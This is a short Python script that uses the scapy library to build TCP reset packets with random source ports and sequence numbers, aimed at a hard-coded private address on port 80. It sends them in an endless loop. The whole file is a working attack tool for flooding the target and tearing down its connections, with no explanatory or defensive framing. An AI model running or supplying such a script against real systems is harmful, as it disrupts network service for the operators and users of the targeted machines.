#!/usr/bin/env python3
from scapy.all import *

target_ip = "10.9.70.137"
target_port = 80  # Change as needed

# Craft a basic TCP RST packet
ip = IP(dst=target_ip)
tcp = TCP(dport=target_port, sport=RandShort(), flags="R", seq=RandInt())

packet = ip/tcp

# Continuously send the packet
while True:
    send(packet, verbose=False)
